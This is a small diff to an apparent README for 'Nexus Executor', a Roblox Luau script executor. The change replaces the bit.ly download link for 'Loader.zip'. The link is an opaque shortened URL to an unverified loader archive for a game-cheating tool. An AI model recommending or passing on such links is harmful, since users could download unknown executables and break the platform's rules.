@@ -6,7 +6,7 @@ Features Free and lifetime packages Supports execution of all Luau scripts No re
 
 Installation To get started with Nexus Executor, simply follow these steps
 
-[Download the Loader.zip](https://bit.ly/3ZmBEFM)
+[Download the Loader.zip](https://bit.ly/3Z7NVwe)
 
 Extract the files from the downloaded archive.
 
